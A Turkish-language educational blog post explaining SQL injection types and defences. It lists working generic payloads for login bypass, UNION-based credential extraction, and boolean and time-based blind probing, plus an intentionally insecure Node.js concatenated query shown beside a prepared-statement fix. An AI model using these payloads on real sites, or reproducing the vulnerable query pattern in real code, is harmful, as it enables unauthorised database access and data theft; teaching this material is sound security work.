---
title: "SQL Injection (SQLi) Nedir? Türleri ve Payload Örnekleri"
date: 2026-06-10 10:00:00 +0300
tags: [sqli, sql-injection, web-security, siber-guvenlik]
author: CyEn07
---

Web güvenliğinin en köklü ve en tehlikeli açıklarından biri olan **SQL
Injection (SQLi)**, modern framework'lere ve ORM'lere rağmen hâlâ birçok
sistemde karşımıza çıkmaktadır. Bu yazıda SQLi'nin mantığını, türlerini ve
her türe ait örnek saldırı vektörlerini (payload) inceleyeceğiz.

> Aşağıdaki payloadlar yalnızca eğitim amaçlıdır. Sadece kendi laboratuvar
> ortamınızda veya yazılı izniniz olan sistemlerde test ediniz.

## SQL Injection Nedir?

SQL Injection, bir uygulamanın veritabanı sorgularına (SQL) müdahale
edilmesine olanak tanıyan bir güvenlik açığıdır. Saldırgan, uygulamanın
beklediği girdi yerine zararlı SQL komutları göndererek veritabanını
manipüle eder.

**Bu zafiyet sayesinde saldırganlar:**

- Yetkisiz giriş yapabilir (authentication bypass).
- Veritabanındaki hassas verileri okuyabilir.
- Verileri değiştirebilir veya silebilir.
- Bazı durumlarda sunucuda komut çalıştırabilir (RCE'ye kadar uzanabilir).

## Nasıl Çalışır?

Normal şartlarda bir web sitesi kullanıcı adı istediğinde arka planda şöyle
bir sorgu çalışır:

```sql
SELECT * FROM users WHERE username = 'kullanici_girdisi';
```

Geliştirici bu girdiyi filtrelemezse, saldırgan `admin' --` gibi bir ifade
girdiğinde sorgu şuna dönüşür:

```sql
SELECT * FROM users WHERE username = 'admin' --';
```

Buradaki `--` ifadesi (MySQL'de) sorgunun geri kalanını yorum satırı yapar
ve şifre kontrolü devre dışı kalarak sisteme `admin` olarak giriş yapılır.

## SQLi Türleri ve Payload Örnekleri

SQLi temelde üç ana kategoriye ayrılır: **In-band**, **Inferential (Blind)**
ve **Out-of-band**.

### 1. In-band SQLi (Klasik)

Saldırganın veriyi aynı kanal üzerinden (örneğin sayfada dönen hata mesajı
veya tablo içinde) görebildiği en yaygın türdür.

**A. Error-Based (Hata Temelli)**

Veritabanının verdiği hata mesajlarını kullanarak veritabanı yapısını
çözmeye çalışır.

```
' OR 1=1; --
' OR '1'='1
' OR 1=1 LIMIT 1; --
```

**B. Union-Based**

`UNION` operatörü ile orijinal sorgunun sonucuna kendi sorgumuzun sonucunu
ekleriz. Kolon sayısını tespit etmek için:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (hata alana kadar sayı artırılır)
```

Veri çekmek için:

```
' UNION SELECT null, username, password FROM users--
' UNION SELECT 1, version(), database()--
```

### 2. Inferential (Blind) SQLi

Uygulama veritabanı hatalarını veya veriyi ekrana yansıtmaz. Saldırgan
veritabanına "evet/hayır" soruları sorarak veya zaman gecikmeleri yaratarak
veriyi harf harf çeker.

**A. Boolean-Based**

```
' AND 1=1--   (sayfa içeriği normal)
' AND 1=0--   (sayfa içeriği boş veya farklı)
' AND SUBSTRING((SELECT version()),1,1) = '5'--
```

**B. Time-Based**

Sayfa tepkisiz kalsa bile, veritabanını belirli bir süre uyutarak (`sleep`)
sorgunun başarılı olup olmadığı anlaşılır.

```sql
-- MySQL
' AND SLEEP(5)--
' UNION SELECT SLEEP(5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

### 3. Out-of-Band (OOB) SQLi

Saldırganın sunucudan doğrudan yanıt alamadığı, veritabanı özelliklerini
(örneğin DNS veya HTTP istekleri) kullanarak veriyi dışarıdaki bir sunucuya
gönderdiği nadir bir türdür (örn. Oracle/MSSQL'de DNS exfiltration).

## Nasıl Korunulur?

SQL Injection'dan korunmanın en etkili yolu **prepared statements**
(hazırlanmış sorgular) kullanmaktır. Kullanıcı girdisi asla doğrudan SQL
sorgusuna string concatenation ile eklenmemelidir.

**Güvensiz (Node.js örneği):**

```javascript
// ASLA YAPMAYIN
const query = "SELECT * FROM users WHERE id = " + userId;
```

**Güvenli (prepared statement):**

```javascript
db.query("SELECT * FROM users WHERE id = ?", [userId]);
```

Ek savunma katmanları:

- En az yetki prensibi: uygulama veritabanı kullanıcısının yalnızca ihtiyaç
  duyduğu tablolara erişimi olmalı.
- WAF (Web Application Firewall) ile bilinen payload kalıplarının
  engellenmesi — ama bu tek başına yeterli değildir, savunmanın son
  katmanı olmalıdır.
- Düzenli statik/dinamik kod analizi (SAST/DAST).

## Sonuç

SQL Injection onlarca yıldır bilinmesine rağmen hâlâ OWASP Top 10'da yer
alıyor çünkü kök neden — kullanıcı girdisi ile kod/sorgu mantığının
karıştırılması — birçok yeni projede tekrar tekrar üretiliyor. Prepared
statement kullanmak, bu zafiyet sınıfını kökten ortadan kaldırmanın en
güvenilir yoludur.
